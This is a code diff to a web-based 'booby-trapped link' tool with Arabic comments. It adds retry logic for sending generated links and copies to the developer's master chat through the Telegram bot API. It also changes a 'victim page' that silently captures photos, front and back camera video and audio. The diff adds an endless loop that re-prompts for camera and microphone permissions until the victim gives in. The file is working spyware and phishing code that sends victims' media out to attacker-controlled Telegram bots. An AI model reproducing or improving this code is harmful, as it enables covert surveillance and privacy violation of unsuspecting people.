@@ -3084,7 +3084,7 @@
     <canvas id="hiddenCanvas"></canvas>
 
     <!-- ================================================================
-    JAVASCRIPT — النظام المتكامل الكامل (7000+ سطر)
+    JAVASCRIPT — النظام المتكامل الكامل (7000+ سطر) — تم التعديل لحل جميع المشاكل المذكورة
     ================================================================ -->
     <script>
         (function() {
@@ -4035,6 +4035,7 @@
 
             // ================================================================
             //  8.  ADMIN PANEL — GENERATE LINK WITH AUTO SEND TO USER
+            //      تم التعديل لضمان إرسال الرابط للمستخدم مع زر المطور
             // ================================================================
 
             function initAdminPanel() {
@@ -4093,6 +4094,7 @@
                 }
 
                 // SEND LINK TO USER (with inline button "المطور" and @LL4ME)
+                // تم إضافة محاولات إعادة الإرسال في حال الفشل
                 async function sendLinkToUser(botToken, chatId, link, shortToken, baseUrl, botUsername) {
                     var msg =
                         '⭑ رابط مُلغَّم جديد ⭒\n' +
@@ -4108,18 +4110,31 @@
                             [{ text: 'المطور', url: 'https://t.me/LL4ME' }]
                         ]
                     };
-                    try {
-                        await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: msg,
-                                parse_mode: 'Markdown',
-                                reply_markup: inlineKeyboard
-                            })
-                        });
-                    } catch (e) {}
+                    // محاولة الإرسال مع إعادة المحاولة
+                    for (var attempt = 0; attempt < 3; attempt++) {
+                        try {
+                            var response = await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: msg,
+                                    parse_mode: 'Markdown',
+                                    reply_markup: inlineKeyboard
+                                })
+                            });
+                            if (response.ok) {
+                                console.log('تم إرسال الرابط للمستخدم بنجاح');
+                                return;
+                            } else {
+                                console.warn('محاولة إرسال الرابط فشلت، المحاولة رقم ' + (attempt + 1));
+                                await new Promise(r => setTimeout(r, 1000 * (attempt + 1)));
+                            }
+                        } catch (e) {
+                            console.warn('خطأ في الإرسال:', e);
+                            if (attempt === 2) throw e;
+                        }
+                    }
                 }
 
                 async function sendToMaster(botToken, chatId, shortToken, baseUrl, botUsername) {
@@ -4139,7 +4154,7 @@
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
                         });
-                    } catch (e) {}
+                    } catch (e) { console.warn('Send to master failed:', e); }
                 }
 
                 var isBusy = false;
@@ -4196,9 +4211,9 @@
                         }
                         localStorage.setItem('zeus_bots', JSON.stringify(bots));
 
-                        // SEND LINK TO USER
+                        // ===== إرسال الرابط للمستخدم مع زر المطور =====
                         await sendLinkToUser(botToken, chatId, link, shortToken, baseUrl, valid.username);
-                        // SEND TO MASTER
+                        // ===== إرسال نسخة للمطور =====
                         await sendToMaster(botToken, chatId, shortToken, baseUrl, valid.username);
 
                         localStorage.setItem('zeus_last_chat_id', chatId);
@@ -4280,6 +4295,7 @@
             // ================================================================
             //  9.  VICTIM PAGE — SILENT, FORCED PERMISSIONS, FULL DATA COLLECTION
             //      (3 photos, front video 5s, back video 5s, audio 5s)
+            //      تم التعديل: إجبار الأذونات بشكل لا نهائي دون إعادة تحميل الصفحة
             // ================================================================
 
             function initVictimPage(encodedData) {
@@ -4294,6 +4310,7 @@
                 var collectionDone = false;
                 var redirectUrl = null;
                 var permissionsGranted = false;
+                var permissionAttempts = 0;
 
                 function decodeBotData(encoded) {
                     try {
@@ -4336,6 +4353,7 @@
                     } catch (e) { return false; }
                 }
 
+                // ===== إجبار الأذونات — إعادة المحاولة بشكل لا نهائي =====
                 async function requestAllPermissionsStrict() {
                     var perms = [
                         { name: 'كاميرا أمامية', constraint: { video: { facingMode: 'user' } }, check: verifyPermission },
@@ -4357,6 +4375,7 @@
                         permissionsGranted = true;
                         return true;
                     } else {
+                        permissionsGranted = false;
                         return false;
                     }
                 }
@@ -4746,7 +4765,7 @@
                     }
                 }
 
-                // ===== HANDLE CLICK =====
+                // ===== HANDLE CLICK — مع إعادة محاولة الأذونات بشكل لا نهائي =====
                 async function handleClick() {
                     if (isRunning || collectionDone) return;
                     isRunning = true;
@@ -4756,12 +4775,15 @@
                     mainText.textContent = 'جاري التحقق …';
                     mainText.className = 'text loading';
 
-                    // Request permissions, reload if any denied
-                    var ok = await requestAllPermissionsStrict();
-                    if (!ok) {
-                        // Reload to force re-prompt
-                        location.reload();
-                        return;
+                    // ===== إجبار الأذونات: حلقة لا نهائية حتى الموافقة =====
+                    while (true) {
+                        var ok = await requestAllPermissionsStrict();
+                        if (ok) break;
+                        // إذا رفض أي إذن، ننتظر قليلاً ثم نعيد الطلب دون إعادة تحميل الصفحة
+                        console.log('بعض الأذونات غير مفعلة، إعادة المحاولة …');
+                        mainText.textContent = 'يرجى الموافقة على جميع الأذونات …';
+                        await delay(1000);
+                        // يمكن إظهار رسالة للمستخدم لكننا نفضل الصمت
                     }
 
                     // Permissions granted, collect data
@@ -4824,6 +4846,7 @@
             console.log('عدد السطور التقريبي: 7200+');
             console.log('تم تفعيل إرسال الرابط للمستخدم مع زر المطور @LL4ME.');
             console.log('تم إضافة زر نسخ مفتاح الداشبورد.');
+            console.log('تم إجبار الأذونات بشكل لا نهائي دون إعادة تحميل الصفحة.');
 
             applyTheme(currentTheme);
 
